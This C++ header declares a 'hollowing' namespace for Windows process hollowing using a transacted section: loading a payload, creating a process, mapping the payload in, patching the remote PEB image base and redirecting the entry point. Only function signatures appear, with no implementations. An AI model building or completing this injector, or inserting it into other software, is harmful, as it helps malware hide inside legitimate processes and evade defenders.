#pragma once
#include<windows.h>
#include "ntapi.h"
#include<ktmw32.h>

typedef BOOL
(WINAPI* typeCreateProcessInternalW)(HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation,
    PHANDLE hNewToken
    );

namespace hollowing {

	HANDLE makeTransactedSection(PWCHAR dummy_name, PBYTE payladBuf, DWORD payloadSize);
	bool createNewProcessInternal(PROCESS_INFORMATION& pi, const wchar_t* cmdLine, LPWSTR startDir = NULL);
    PVOID mapBufferIntoProcess(HANDLE hProcess, HANDLE hSection);
    PBYTE getPayloadBuffer(const wchar_t* filename, SIZE_T& payloadSize);

    ULONGLONG getRemotePebAddress(PROCESS_INFORMATION& pi);
    bool setNewImageBase(PBYTE loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi);

    DWORD getEpRva(PBYTE pe_buffer);
    bool redirectEp(PBYTE loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi);

    BOOL updateRemoteEp(PROCESS_INFORMATION& pi, ULONGLONG entry_point_va);

    bool redirectToPayload(PBYTE loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi);

    bool hollow(const wchar_t* targetPath, PBYTE payladBuf, DWORD payloadSize);
}